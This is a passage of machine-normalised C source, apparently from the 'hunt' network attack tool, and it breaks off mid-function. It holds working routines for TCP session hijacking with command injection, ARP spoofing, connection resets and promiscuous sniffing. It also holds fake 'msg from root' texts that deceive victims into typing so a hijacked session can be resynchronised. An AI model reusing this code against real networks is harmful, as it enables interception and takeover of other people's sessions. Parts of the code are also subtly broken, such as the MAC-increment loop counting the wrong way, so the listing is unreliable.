// file sniff.c line 543
static void stop_sniff(void)
{
  struct list_iterator li;
  struct packet *p;
  struct sniff_info *si;
  struct sniff_log *slog;
  void *return_value_list_pop_1;
  void *return_value_list_iter_get_2;
  void *return_value_list_pop_3;
  if(sniffer_running == 0)
    printf("sniffer isn't running\n");

  else
  {
    list_remove(&l_ifunc_tcp, (void *)&ifunc_sniff);
    do
    {
      return_value_list_pop_1=list_pop(&l_sniff_pkt);
      p = (struct packet *)return_value_list_pop_1;
      if(p == ((struct packet *)NULL))
        break;

      si = (struct sniff_info *)p->p_arg[(signed long int)4];
      sniff_info_release(si);
      packet_free(p);
    }
    while((_Bool)1);
    list_produce_done(&l_sniff_pkt);
    pthread_join(sniff_thr, (void **)(void *)0);
    list_lock(&l_sniff_db);
    list_iter_set(&li, &l_sniff_db);
    do
    {
      return_value_list_iter_get_2=list_iter_get(&li);
      si = (struct sniff_info *)return_value_list_iter_get_2;
      if(si == ((struct sniff_info *)NULL))
        break;

      do
      {
        return_value_list_pop_3=list_pop(&si->log);
        slog = (struct sniff_log *)return_value_list_pop_3;
        if(slog == ((struct sniff_log *)NULL))
          break;

        free_sniff_log(slog);
      }
      while((_Bool)1);
    }
    while((_Bool)1);
    list_iter_end(&li);
    list_unlock(&l_sniff_db);
    sniffer_running = 0;
    printf("sniffer stopped\n");
  }
}

// storm_reset_sec_setup
// file options.c line 89
static void storm_reset_sec_setup(void)
{
  signed int sec;
  sec=menu_choose_unr("ACK storm reset sec", 0, 10000, storm_reset_sec);
  if(sec >= 0)
    storm_reset_sec = sec;

}

// stormack_hijack
// file hijack.c line 202
signed int stormack_hijack(struct conn_info *ci, char *cmdbuf)
{
  struct iphdr *iph;
  struct tcphdr *tcph;
  struct tcp_spec ts;
  struct timespec relts;
  struct ifunc_item ifunc_dst;
  struct ifunc_item ifunc_src;
  struct ifunc_item ifunc_ack;
  struct packet *p;
  struct timeval reset_time;
  struct timeval now;
  unsigned int src_ack = (unsigned int)0;
  signed int src_ack_count = -1;
  signed int reset_it = 0;
  signed int count_dst = 0;
  signed int ack_storm_detect = 30;
  signed int cmdbuf_len;
  unsigned long int return_value_strlen_1;
  return_value_strlen_1=strlen(cmdbuf);
  cmdbuf_len = (signed int)return_value_strlen_1;
  memset((void *)&ts, 0, sizeof(struct tcp_spec) /*88ul*/ );
  ts.saddr = ci->src_addr;
  ts.daddr = ci->dst_addr;
  ts.sport = ci->src_port;
  ts.dport = ci->dst_port;
  ts.src_mac = (char *)ci->dst.dst_mac;
  ts.dst_mac = (char *)ci->dst.src_mac;
  ts.seq = ci->dst.next_d_seq;
  ts.ack_seq = ci->dst.next_seq;
  signed int tmp_if_expr_3;
  unsigned short int tmp_statement_expression_2;
  if(!(ci->src.window == 0))
    tmp_if_expr_3 = (signed int)ci->src.window;

  else
  {
    unsigned short int __v;
    unsigned short int __x = (unsigned short int)242;
    asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
    tmp_statement_expression_2 = __v;
    tmp_if_expr_3 = (signed int)tmp_statement_expression_2;
  }
  ts.window = (unsigned short int)tmp_if_expr_3;
  unsigned short int tmp_statement_expression_4;
  unsigned short int stormack_hijack__1__2____v;
  unsigned short int stormack_hijack__1__2____x;
  unsigned short int tmp_statement_expression_5;
  unsigned short int stormack_hijack__1__2__1____v;
  unsigned short int stormack_hijack__1__2__1____x = (unsigned short int)ci->src.id;
  asm("rorw _8, %w0" : "=r"(stormack_hijack__1__2__1____v) : "0"(stormack_hijack__1__2__1____x) : "cc");
  tmp_statement_expression_5 = stormack_hijack__1__2__1____v;
  stormack_hijack__1__2____x = (unsigned short int)((signed int)tmp_statement_expression_5 + 1);
  asm("rorw _8, %w0" : "=r"(stormack_hijack__1__2____v) : "0"(stormack_hijack__1__2____x) : "cc");
  tmp_statement_expression_4 = stormack_hijack__1__2____v;
  ts.id = tmp_statement_expression_4;
  ts.ack = 1;
  ts.psh = 1;
  ts.rst = 0;
  ts.data = cmdbuf;
  ts.data_len = cmdbuf_len;
  list_produce_start(&l_hijack_conn);
  ifunc_ack.func = (void (*)(struct packet *, void *))fast_ack_to_dst;
  ifunc_ack.arg = (void *)ci;
  list_enqueue(&l_ifunc_fast_tcp, (void *)&ifunc_ack);
  ifunc_dst.func = (void (*)(struct packet *, void *))func_hijack_dst;
  ifunc_dst.arg = (void *)ci;
  list_enqueue(&l_ifunc_tcp, (void *)&ifunc_dst);
  ifunc_src.func = (void (*)(struct packet *, void *))func_hijack_src;
  ifunc_src.arg = (void *)ci;
  list_enqueue(&l_ifunc_tcp, (void *)&ifunc_src);
  send_tcp_packet(&ts);
  relts.tv_sec = (signed long int)stormack_hijack_wait_sec;
  relts.tv_nsec = (signed long int)0;
  void *return_value_list_consume_rel_6;
  _Bool tmp_if_expr_7;
  _Bool tmp_if_expr_8;
  _Bool tmp_if_expr_9;
  do
  {
    return_value_list_consume_rel_6=list_consume_rel(&l_hijack_conn, &relts);
    p = (struct packet *)return_value_list_consume_rel_6;
    if(p == ((struct packet *)NULL))
      break;

    iph = p->p_iph;
    tcph = p->p_hdr.p_tcph;
    if((unsigned long int)iph->saddr == ci->dst_addr)
      tmp_if_expr_7 = (unsigned long int)iph->daddr == ci->src_addr ? (_Bool)1 : (_Bool)0;

    else
      tmp_if_expr_7 = (_Bool)0;
    if(tmp_if_expr_7)
      tmp_if_expr_8 = tcph->_anon0._anon1.source == ci->dst_port ? (_Bool)1 : (_Bool)0;

    else
      tmp_if_expr_8 = (_Bool)0;
    if(tmp_if_expr_8)
      tmp_if_expr_9 = tcph->_anon0._anon1.dest == ci->src_port ? (_Bool)1 : (_Bool)0;

    else
      tmp_if_expr_9 = (_Bool)0;
    if(tmp_if_expr_9)
    {
      if(!(p->p_data_len == 0))
      {
        count_dst = count_dst + 1;
        print_data_packet(p, p->p_data_len, count_dst, 1);
      }

      packet_free(p);
    }

    else
    {
      if(!(src_ack == (unsigned int)p->p_hdr.p_tcph->_anon0._anon1.ack) || !(src_ack_count >= 0))
      {
        src_ack = (unsigned int)p->p_hdr.p_tcph->_anon0._anon1.ack;
        src_ack_count = 0;
      }

      else
      {
        src_ack_count = src_ack_count + 1;
        if(!(ack_storm_detect >= src_ack_count))
        {
          if(reset_it == 0)
          {
            set_tty_color((enum TTY_COLOR)COLOR_BRIGHTRED);
            printf("ACK storm detected - reset after %ds\n", storm_reset_sec);
            set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
            reset_it = 1;
            gettimeofday(&reset_time, (struct timezone *)(void *)0);
          }

          else
          {
            set_tty_color((enum TTY_COLOR)COLOR_BRIGHTRED);
            printf(".");
            set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
            fflush(stdout);
          }
          ack_storm_detect = ack_storm_detect + 300;
        }

      }
      packet_free(p);
    }
    if(!(reset_it == 0))
    {
      signed int sec;
      signed int usec;
      signed int d_sec;
      gettimeofday(&now, (struct timezone *)(void *)0);
      sec = (signed int)(now.tv_sec - reset_time.tv_sec);
      usec = (signed int)(now.tv_usec - reset_time.tv_usec);
      if(!(usec >= 0))
      {
        usec = usec + 1000000;
        sec = sec - 1;
      }

      d_sec = usec / 100000 + sec * 10;
      if(d_sec >= 10 * storm_reset_sec)
      {
        rst(ci, 5, 2);
        set_tty_color((enum TTY_COLOR)COLOR_BRIGHTRED);
        printf("\n\nreset done\n\n");
        set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
        break;
      }

    }

  }
  while((_Bool)1);
  list_remove(&l_ifunc_fast_tcp, (void *)&ifunc_ack);
  list_remove(&l_ifunc_tcp, (void *)&ifunc_dst);
  list_remove(&l_ifunc_tcp, (void *)&ifunc_src);
  packet_flush(&l_hijack_conn);
  return reset_it != 0 ? 1 : 0;
}

// stormack_hijack_wait_sec_setup
// file options.c line 98
static void stormack_hijack_wait_sec_setup(void)
{
  signed int sec;
  sec=menu_choose_unr("Sec to wait for next cmd with simple hijack", 0, 10000, stormack_hijack_wait_sec);
  if(sec >= 0)
    stormack_hijack_wait_sec = sec;

}

// suggest_mac
// file hunt.h line 431
unsigned char * suggest_mac(void)
{
  signed int i = 6 - 1;
  for( ; i >= 0; i = i + 1)
  {
    __suggest_mac[(signed long int)i] = __suggest_mac[(signed long int)i] + 1;
    if(!((signed int)__suggest_mac[(signed long int)i] == 0))
      break;

    __suggest_mac[(signed long int)i] = __suggest_mac[(signed long int)i] + 1;
  }
  return __suggest_mac;
}

// suggest_mac_setup
// file options.c line 48
static void suggest_mac_setup(void)
{
  char buf[128l];
  unsigned char buf_mac[6l];
  sprintf_eth_mac(buf, __suggest_mac);
  signed int return_value_menu_choose_mac_1;
  return_value_menu_choose_mac_1=menu_choose_mac("suggest MAC base", buf_mac, buf);
  if(return_value_menu_choose_mac_1 >= 0)
    memcpy((void *)__suggest_mac, (const void *)buf_mac, sizeof(unsigned char [6l]) /*6ul*/ );

}

// suggest_sync_msg
// file synchijack.c line 90
static char * suggest_sync_msg(signed int first)
{
  char *retval;
  char *m1[5l] = { "\r\nmsg from root: power failure - try to type %d chars\r\n",
    "\r\nfuck you type %d chars immediately\r\n",
    "\r\nI/O failure detected, %d chars will solve it\r\n",
    "\r\nmachine is going down within 5 min, type %d chars\r\n",
    "\r\nsegmentation fault - %d chars to resume\r\n" };
  char *m2[5l] = { "\r\npower failure detected\r\n... power resumed, ok\r\n",
    "\r\nready\r\n", "\r\nI/O resumed\r\n", "\r\nmachine shutdown canceled\r\n", "\r\nyou have new mail\r\n" };
  static signed int old_count = 0;
  if(!(first == 0))
  {
    static signed int count = 0;
    retval = m1[(signed long int)count];
    old_count = count;
    count = (signed int)((unsigned long int)(count + 1) % (sizeof(char *[5l]) /*40ul*/  / sizeof(char *) /*8ul*/ ));
  }

  else
    retval = m2[(signed long int)old_count];
  return retval;
}

// tap
// file hunt.h line 423
signed int tap(char *device, signed int promisc_mode)
{
  signed int fd;
  struct ifreq ifr;
  unsigned short int tmp_statement_expression_1;
  unsigned short int __v;
  unsigned short int __x = (unsigned short int)0x0003;
  asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
  tmp_statement_expression_1 = __v;
  fd=socket(2, 10, (signed int)tmp_statement_expression_1);
  if(!(fd >= 0))
  {
    if(!(verbose == 0))
      perror("(tap) SOCK_PACKET allocation problems [fatal]");

    exit(1);
  }

  __builtin_strncpy(ifr.ifr_ifrn.ifrn_name, device, (unsigned long int)16);
  ifr.ifr_ifrn.ifrn_name[(signed long int)(16 - 1)] = (char)0;
  signed int return_value_ioctl_2;
  return_value_ioctl_2=ioctl(fd, (unsigned long int)0x8913, &ifr);
  if(!(return_value_ioctl_2 >= 0))
  {
    if(!(verbose == 0))
      perror("(tap) Can't get device flags [fatal]");

    close(fd);
    exit(1);
  }

  if(promisc_mode == 0)
    ifr.ifr_ifru.ifru_flags = ifr.ifr_ifru.ifru_flags & (signed short int)~256;

  else
    ifr.ifr_ifru.ifru_flags = ifr.ifr_ifru.ifru_flags | (signed short int)256;
  signed int return_value_ioctl_3;
  return_value_ioctl_3=ioctl(fd, (unsigned long int)0x8914, &ifr);
  if(!(return_value_ioctl_3 >= 0))
  {
    if(!(verbose == 0))
      perror("(tap) Can't set/unset promiscuous mode [fatal]");

    close(fd);
    exit(1);
  }

  if(promisc_mode == 0)
  {
    close(fd);
    return 0;
  }

  else
  {
    signed int return_value_ioctl_4;
    return_value_ioctl_4=ioctl(fd, (unsigned long int)0x8915, &ifr);
    if(!(return_value_ioctl_4 >= 0))
    {
      if(!(verbose == 0))
        perror("(tap) Can't get interface IP address");

      tap(device, 0);
      exit(1);
    }

    my_eth_ip = *((unsigned int *)(ifr.ifr_ifru.ifru_addr.sa_data + (signed long int)2));
    signed int return_value_ioctl_5;
    return_value_ioctl_5=ioctl(fd, (unsigned long int)0x8927, &ifr);
    if(!(return_value_ioctl_5 >= 0))
    {
      if(!(verbose == 0))
        perror("(tap) Can't get interface HW address");

      tap(device, 0);
      exit(1);
    }

    memcpy((void *)my_eth_mac, (const void *)ifr.ifr_ifru.ifru_hwaddr.sa_data, (unsigned long int)6);
    if(!(verbose == 0))
    {
      char *return_value_host_lookup_6;
      return_value_host_lookup_6=host_lookup(my_eth_ip, 0);
      printf("listeining on %s %s ", device, return_value_host_lookup_6);
      print_eth_mac(my_eth_mac);
      printf("\n");
    }

    return fd;
  }
}

// timejob_thread
// file timer.c line 107
static void * timejob_thread(void *arg)
{
  struct timejob *tj;
  struct timeval tv;
  struct timespec timeout;
  signed int sec;
  signed int return_value_getpid_1;
  return_value_getpid_1=getpid();
  setpriority(0, (unsigned int)return_value_getpid_1, 10);
  pthread_mutex_lock(&timejob_mutex);
  signed int return_value_pthread_kill_2;
  _Bool tmp_if_expr_5;
  _Bool tmp_if_expr_4;
  while(!(timejob_run == 0))
  {
    return_value_pthread_kill_2=pthread_kill(main_thread_id, 0);
    if(!(return_value_pthread_kill_2 == 0))
      break;

    void *return_value_list_peek_3;
    return_value_list_peek_3=list_peek(&timejob_list);
    tj = (struct timejob *)return_value_list_peek_3;
    if(!(tj == ((struct timejob *)NULL)))
    {
      gettimeofday(&tv, (struct timezone *)(void *)0);
      if(!(tj->j_ts.tv_sec >= tv.tv_sec))
        tmp_if_expr_5 = (_Bool)1;

      else
      {
        if(tv.tv_sec == tj->j_ts.tv_sec)
          tmp_if_expr_4 = tv.tv_usec * (signed long int)1000 >= tj->j_ts.tv_nsec ? (_Bool)1 : (_Bool)0;

        else
          tmp_if_expr_4 = (_Bool)0;
        tmp_if_expr_5 = tmp_if_expr_4 ? (_Bool)1 : (_Bool)0;
      }
      if(tmp_if_expr_5)
      {
        timejob_curr = tj;
        list_pop(&timejob_list);
        pthread_mutex_unlock(&timejob_mutex);
        sec=timejob_curr->j_func(timejob_curr->j_arg, timejob_curr->j_arg_sec);
        pthread_mutex_lock(&timejob_mutex);
        if(!(sec == 0))
        {
          gettimeofday(&tv, (struct timezone *)(void *)0);
          tj->j_ts.tv_sec = tv.tv_sec + (signed long int)sec;
          tj->j_ts.tv_nsec = tv.tv_usec * (signed long int)1000;
          __register(tj);
        }

        timejob_curr = (struct timejob *)(void *)0;
        pthread_cond_signal(&timejob_curr_cond);
      }

      else
      {
        timeout = tj->j_ts;
        pthread_cond_timedwait(&timejob_cond, &timejob_mutex, &timeout);
      }
    }

    else
      pthread_cond_wait(&timejob_cond, &timejob_mutex);
  }
  timejob_run = 2;
  pthread_cond_signal(&timejob_run_cond);
  pthread_mutex_unlock(&timejob_mutex);
  return (void *)0;
}

// timer_done
// file hunt.h line 648
void timer_done(void)
{
  pthread_mutex_lock(&timejob_mutex);
  timejob_run = 0;
  pthread_cond_signal(&timejob_cond);
  signed int return_value_pthread_kill_1;
  while(!(timejob_run == 2))
  {
    return_value_pthread_kill_1=pthread_kill(timejob_thr, 0);
    if(!(return_value_pthread_kill_1 == 0))
      break;

    pthread_cond_wait(&timejob_run_cond, &timejob_mutex);
  }
  pthread_mutex_unlock(&timejob_mutex);
}

// timer_init
// file hunt.h line 647
void timer_init(void)
{
  signed int return_value_pthread_create_1;
  return_value_pthread_create_1=pthread_create(&timejob_thr, (const union pthread_attr_t *)(void *)0, timejob_thread, (void *)0);
  if(!(return_value_pthread_create_1 == 0))
    exit(1);

}

// tj_func
// file main.c line 454
signed int tj_func(void *arg, signed int sec)
{
  printf("tj func %s return %d\n", (char *)arg, sec);
  return sec;
}

// tty_atexit
// file hunt.h line 586
void tty_atexit(void)
{
  if(ttysavefd >= 0 && !((signed int)ttystate == RESET))
    tty_reset(ttysavefd);

}

// tty_cbreak
// file tty.c line 19
signed int tty_cbreak(signed int fd, signed int wait_for_chars, signed int timer_dsec)
{
  struct termios buf;
  signed int return_value_tcgetattr_1;
  return_value_tcgetattr_1=tcgetattr(fd, &save_termios);
  if(!(return_value_tcgetattr_1 >= 0))
    return -1;

  else
  {
    buf = save_termios;
    buf.c_lflag = buf.c_lflag & (unsigned int)~(0000010 | 0000002);
    buf.c_cc[(signed long int)6] = (unsigned char)wait_for_chars;
    buf.c_cc[(signed long int)5] = (unsigned char)timer_dsec;
    signed int return_value_tcsetattr_2;
    return_value_tcsetattr_2=tcsetattr(fd, 2, &buf);
    if(!(return_value_tcsetattr_2 >= 0))
      return -1;

    else
    {
      ttystate = (enum anonymous_10)CBREAK;
      ttysavefd = fd;
      return 0;
    }
  }
}

// tty_raw
// file hunt.h line 584
signed int tty_raw(signed int fd, signed int wait_for_chars, signed int timer_dsec)
{
  struct termios buf;
  signed int return_value_tcgetattr_1;
  return_value_tcgetattr_1=tcgetattr(fd, &save_termios);
  if(!(return_value_tcgetattr_1 >= 0))
    return -1;

  else
  {
    buf = save_termios;
    buf.c_lflag = buf.c_lflag & (unsigned int)~(0000010 | 0000002 | 0100000 | 0000001);
    buf.c_iflag = buf.c_iflag & (unsigned int)~(0000002 | 0000400 | 0000020 | 0000040 | 0002000);
    buf.c_cflag = buf.c_cflag & (unsigned int)~(0000060 | 0000400);
    buf.c_cflag = buf.c_cflag | (unsigned int)0000060;
    buf.c_oflag = buf.c_oflag & (unsigned int)~0000001;
    buf.c_cc[(signed long int)6] = (unsigned char)wait_for_chars;
    buf.c_cc[(signed long int)5] = (unsigned char)timer_dsec;
    signed int return_value_tcsetattr_2;
    return_value_tcsetattr_2=tcsetattr(fd, 2, &buf);
    if(!(return_value_tcsetattr_2 >= 0))
      return -1;

    else
    {
      ttystate = (enum anonymous_10)RAW;
      ttysavefd = fd;
      return 0;
    }
  }
}

// tty_reset
// file hunt.h line 585
signed int tty_reset(signed int fd)
{
  if(!((signed int)ttystate == RAW) && !((signed int)ttystate == CBREAK))
    return 0;

  else
  {
    signed int return_value_tcsetattr_1;
    return_value_tcsetattr_1=tcsetattr(fd, 2, &save_termios);
    if(!(return_value_tcsetattr_1 >= 0))
      return -1;

    else
    {
      ttystate = (enum anonymous_10)RESET;
      return 0;
    }
  }
}

// tty_tput_reset
// file hunt.h line 587
void tty_tput_reset(void)
{
  printf("\033c\033]R");
  fflush(stdout);
}

// uci_generate_key
// file hunt.h line 307
static inline unsigned int uci_generate_key(struct user_conn_info *uci)
{
  unsigned int return_value___bswap_32_1;
  return_value___bswap_32_1=__bswap_32((unsigned int)uci->src_addr);
  unsigned int return_value___bswap_32_2;
  return_value___bswap_32_2=__bswap_32((unsigned int)uci->dst_addr);
  unsigned short int tmp_statement_expression_3;
  unsigned short int __v;
  unsigned short int uci_generate_key__1__1____x = (unsigned short int)uci->src_port;
  asm("rorw _8, %w0" : "=r"(__v) : "0"(uci_generate_key__1__1____x) : "cc");
  tmp_statement_expression_3 = __v;
  unsigned short int tmp_statement_expression_4;
  unsigned short int uci_generate_key__1__2____v;
  unsigned short int __x = (unsigned short int)uci->dst_port;
  asm("rorw _8, %w0" : "=r"(uci_generate_key__1__2____v) : "0"(__x) : "cc");
  tmp_statement_expression_4 = uci_generate_key__1__2____v;
  unsigned int return_value_generate_key_5;
  return_value_generate_key_5=generate_key((unsigned long int)return_value___bswap_32_1, (unsigned long int)return_value___bswap_32_2, tmp_statement_expression_3, tmp_statement_expression_4);
  return return_value_generate_key_5;
}

// uci_generate_key_link1
// file hunt.h line 307
static inline unsigned int uci_generate_key_link1(struct user_conn_info *uci_link1)
{
  unsigned int return_value___bswap_32_1_link1;
  return_value___bswap_32_1_link1=__bswap_32_link2((unsigned int)uci_link1->src_addr);
  unsigned int return_value___bswap_32_2_link1;
  return_value___bswap_32_2_link1=__bswap_32_link2((unsigned int)uci_link1->dst_addr);
  unsigned short int tmp_statement_expression_3_link1;
  unsigned short int __v_link1;
  unsigned short int uci_generate_key__1__1____x_link1 = (unsigned short int)uci_link1->src_port;
  asm("rorw _8, %w0" : "=r"(__v_link1) : "0"(uci_generate_key__1__1____x_link1) : "cc");
  tmp_statement_expression_3_link1 = __v_link1;
  unsigned short int tmp_statement_expression_4_link1;
  unsigned short int uci_generate_key__1__2____v_link1;
  unsigned short int __x_link1 = (unsigned short int)uci_link1->dst_port;
  asm("rorw _8, %w0" : "=r"(uci_generate_key__1__2____v_link1) : "0"(__x_link1) : "cc");
  tmp_statement_expression_4_link1 = uci_generate_key__1__2____v_link1;
  unsigned int return_value_generate_key_5_link1;
  return_value_generate_key_5_link1=generate_key_link1((unsigned long int)return_value___bswap_32_1_link1, (unsigned long int)return_value___bswap_32_2_link1, tmp_statement_expression_3_link1, tmp_statement_expression_4_link1);
  return return_value_generate_key_5_link1;
}

// unregister_timejob
// file hunt.h line 646
void unregister_timejob(struct timejob *tj)
{
  pthread_mutex_lock(&timejob_mutex);
  while(timejob_curr == tj)
    pthread_cond_wait(&timejob_curr_cond, &timejob_mutex);
  list_remove(&timejob_list, (void *)tj);
  pthread_cond_signal(&timejob_cond);
  pthread_mutex_unlock(&timejob_mutex);
}

// update_a_items
// file c/array.c line 14
static inline void update_a_items(struct array *a, signed int nr, void *m)
{
  if(!((a->a_arr + (signed long int)nr)->ai_data == NULL))
  {
    if(m == NULL)
      a->a_items = a->a_items - 1;

  }

  else
    if(!(m == NULL))
      a->a_items = a->a_items + 1;

}

// update_thr
// file resolv.c line 127
static void * update_thr(void *arg)
{
  struct timeval timeout;
  struct anonymous_29 rdset;
  signed int fd = (signed int)arg;
  struct res r;
  char buf[256l];
  signed int update_thr_run;
  signed int retval;
  signed long int __time;
  signed long int last_time_check;
  pthread_sigmask(0, &intr_mask, (struct anonymous_3 *)(void *)0);
  signed int return_value_getpid_1;
  if(!(verbose == 0))
  {
    return_value_getpid_1=getpid();
    printf("update resolv thread pid %d\n", return_value_getpid_1);
  }

  signed int return_value_getpid_2;
  return_value_getpid_2=getpid();
  setpriority(0, (unsigned int)return_value_getpid_2, 10);
  update_thr_run = 1;
  last_time_check = (signed long int)0;
  signed int return_value_pthread_kill_3;
  signed long int return_value_read_5;
  while(!(update_thr_run == 0))
  {
    return_value_pthread_kill_3=pthread_kill(main_thread_id, 0);
    if(!(return_value_pthread_kill_3 == 0))
      break;

    do
    {
      signed int __d0;
      signed int __d1;
      asm("cld; rep; stosq" : "=c"(__d0), "=D"(__d1) : "a"(0), "0"(sizeof(struct anonymous_29) /*128ul*/  / sizeof(signed long int) /*8ul*/ ), "1"(&(&rdset)->__fds_bits[(signed long int)0]) : "memory");
    }
    while((_Bool)0);
    (&rdset)->__fds_bits[(signed long int)(fd / (8 * (signed int)sizeof(signed long int) /*8ul*/ ))] = (&rdset)->__fds_bits[(signed long int)(fd / (8 * (signed int)sizeof(signed long int) /*8ul*/ ))] | (signed long int)(1UL << fd % (8 * (signed int)sizeof(signed long int) /*8ul*/ ));
    timeout.tv_sec = (signed long int)(10 > 10 ? 10 : 10);
    timeout.tv_usec = (signed long int)0;
    retval=select(fd + 1, &rdset, (struct anonymous_29 *)(void *)0, (struct anonymous_29 *)(void *)0, &timeout);
    if(retval >= 1)
    {
      if(!((rdset.__fds_bits[(signed long int)(fd / 8)] & (signed long int)(1UL << fd % 8)) == 0l))
      {
        return_value_read_5=read(fd, (void *)&r, sizeof(struct res) /*12ul*/ );
        if((unsigned long int)return_value_read_5 == sizeof(struct res) /*12ul*/ )
        {
          if(r.err == 0 && !(r.name_len == 0))
          {
            signed long int return_value_read_4;
            return_value_read_4=read(fd, (void *)buf, (unsigned long int)r.name_len);
            if(!(return_value_read_4 == (signed long int)r.name_len))
              printf("bad read of len in update thr\n");

            buf[(signed long int)r.name_len] = (char)0;
            resolv_put(r.ip, buf);
          }

        }

      }

    }

    __time=time((signed long int *)(void *)0);
    if(!(10l + last_time_check >= __time))
    {
      check_interval((signed int)__time);
      last_time_check = __time;
    }

  }
  return (void *)0;
}

// usage
// file main.c line 413
static void usage(char *argv0)
{
  char *prog_name;
  prog_name=strrchr(argv0, 47);
  if(!(prog_name == ((char *)NULL)))
    prog_name = prog_name + 1l;

  else
    prog_name = argv0;
  fprintf(stderr, "usage: %s -vV [-i eth_interface]\n", prog_name);
}

// user_arp_hijack
// file hunt.h line 503
signed int user_arp_hijack(struct user_conn_info *uci, char *src_fake_mac, char *dst_fake_mac, signed int input_mode)
{
  struct conn_info *ci;
  signed int retval;
  ci=conn_get(uci);
  if(ci == ((struct conn_info *)NULL))
  {
    printf("connection isn't available\n");
    retval = 1;
  }

  else
  {
    retval=arp_hijack(ci, src_fake_mac, dst_fake_mac, input_mode);
    conn_free(ci);
  }
  return retval;
}

// user_arp_hijack_done
// file hunt.h line 505
void user_arp_hijack_done(char *src_fake_mac, char *dst_fake_mac)
{
  arp_hijack_done(src_fake_mac, dst_fake_mac);
}

// user_arpspoof_test
// file hunt.h line 529
signed int user_arpspoof_test(struct arp_spoof_info *asi)
{
  char mac_buf[64l];
  signed int retval;
  retval=find_asi_dst_mac(asi, "dst mac isn't known - cannot do test\n");
  if(!(retval >= 0))
    return retval;

  else
  {
    signed int return_value_arpspoof_test_1;
    return_value_arpspoof_test_1=arpspoof_test(asi);
    if(return_value_arpspoof_test_1 == 0)
      return 0;

    else
    {
      sprintf_eth_mac(mac_buf, asi->src_fake_mac);
      set_tty_color((enum TTY_COLOR)COLOR_BRIGHTRED);
      char *return_value_host_lookup_2;
      return_value_host_lookup_2=host_lookup(asi->src_addr, hl_mode);
      char *return_value_host_lookup_3;
      return_value_host_lookup_3=host_lookup(asi->dst_addr, hl_mode);
      printf("ARP spoof of %s with fake mac %s in host %s FAILED\n", return_value_host_lookup_2, (const void *)mac_buf, return_value_host_lookup_3);
      set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
      fflush(stdout);
      return -1;
    }
  }
}

// user_hijack_sync
// file hunt.h line 512
signed int user_hijack_sync(struct user_conn_info *uci)
{
  struct conn_info *ci;
  signed int retval;
  ci=conn_get(uci);
  if(ci == ((struct conn_info *)NULL))
  {
    printf("connection isn't available\n");
    retval = 1;
  }

  else
  {
    retval=hijack_sync(ci);
    if(!(retval >= 0))
      printf("sync failed\n");

    conn_free(ci);
  }
  return retval;
}

// user_rst
// file hunt.h line 474
void user_rst(struct user_conn_info *uci, signed int count, signed int mode)
{
  struct conn_info *ci;
  unsigned int key;
  ci=conn_get(uci);
  if(ci == ((struct conn_info *)NULL))
    printf("connection isn't available\n");

  else
  {
    switch(mode)
    {
      case 2:
      {
        rst(ci, count, 0);
        rst(ci, count, 1);
        break;
      }
      case 0:
      {
        rst(ci, count, 0);
        break;
      }
      case 1:
        rst(ci, count, 1);
    }
    key=uci_generate_key_link1(uci);
    hash_remove(&conn_table, key, (void *)uci);
    conn_free(ci);
  }
}

// user_run_arpspoof_until_successed
// file hunt.h line 532
signed int user_run_arpspoof_until_successed(struct arp_spoof_info *asi)
{
  signed int return_value_menu_choose_char_1;
  return_value_menu_choose_char_1=menu_choose_char("do you want to force arp spoof until successed y/n", "yn", (char)121);
  signed int return_value_run_arpspoof_until_successed_2;
  switch(return_value_menu_choose_char_1)
  {
    case 121:
    {
      return_value_run_arpspoof_until_successed_2=run_arpspoof_until_successed(asi);
      if(return_value_run_arpspoof_until_successed_2 == 0)
      {
        printf("ARP spoof successed\n");
        return 0;
      }

      else
      {
        printf("ARP spoof failed\n");
        return -1;
      }
    }
    case 110:
      return -1;
    default:
      return -1;
  }
}

// user_stormack_hijack
// file hunt.h line 490
signed int user_stormack_hijack(struct user_conn_info *uci, char *cmdbuf)
{
  struct conn_info *ci;
  signed int retval;
  ci=conn_get(uci);
  if(ci == ((struct conn_info *)NULL))
  {
    printf("connection isn't available\n");
    retval = 1;
  }

  else
  {
    retval=stormack_hijack(ci, cmdbuf);
    conn_free(ci);
  }
  return retval;
}

// verbose_setup
// file options.c line 194
static void verbose_setup(void)
{
  signed int return_value_menu_choose_char_1;
  return_value_menu_choose_char_1=menu_choose_char("verbose", "yn", (char)(verbose != 0 ? 121 : 110));
  switch(return_value_menu_choose_char_1)
  {
    case 121:
    {
      verbose = 1;
      break;
    }
    case 110:
      verbose = 0;
  }
}

// watch_tty
// file arphijack.c line 52
static void * watch_tty(struct watch_tty_data *wtd)
{
  struct tcp_spec ts;
  char buf[256l];
  signed int nr;
  if(wtd->input_mode == 0)
    tty_raw(0, 1, 0);

  signed long int return_value_read_1;
  _Bool tmp_if_expr_3;
  signed int tmp_post_2;
  signed int tmp_if_expr_5;
  unsigned short int tmp_statement_expression_4;
  unsigned short int tmp_statement_expression_6;
  unsigned short int tmp_statement_expression_7;
  do
  {
    return_value_read_1=read(0, (void *)buf, sizeof(char [256l]) /*256ul*/ );
    nr = (signed int)return_value_read_1;
    if(nr == 0)
      break;

    if((signed int)buf[0l] == 29)
      break;

    if(wtd->input_mode == 2)
      tmp_if_expr_3 = (_Bool)1;

    else
      tmp_if_expr_3 = wtd->input_mode == 1 ? (_Bool)1 : (_Bool)0;
    if(tmp_if_expr_3)
    {
      if(nr >= 3)
      {
        if((signed int)buf[0l] == 94)
        {
          if((signed int)buf[1l] == 93)
          {
            if((signed int)buf[2l] == 10)
              break;

          }

        }

      }

      if(wtd->input_mode == 1)
      {
        if(!((unsigned long int)nr >= sizeof(char [256l]) /*256ul*/ ))
        {
          if((signed int)buf[(signed long int)(nr + -1)] == 10)
          {
            buf[(signed long int)(nr - 1)] = (char)13;
            tmp_post_2 = nr;
            nr = nr + 1;
            buf[(signed long int)tmp_post_2] = (char)10;
          }

        }

      }

    }

    memset((void *)&ts, 0, sizeof(struct tcp_spec) /*88ul*/ );
    ts.saddr = wtd->ci->src_addr;
    ts.daddr = wtd->ci->dst_addr;
    ts.sport = wtd->ci->src_port;
    ts.dport = wtd->ci->dst_port;
    ts.src_mac = wtd->src_fake_mac;
    ts.dst_mac = (char *)wtd->ci->dst.src_mac;
    ts.seq = wtd->ci->dst.next_d_seq;
    ts.ack_seq = wtd->ci->dst.next_seq;
    if(!(wtd->ci->src.window == 0))
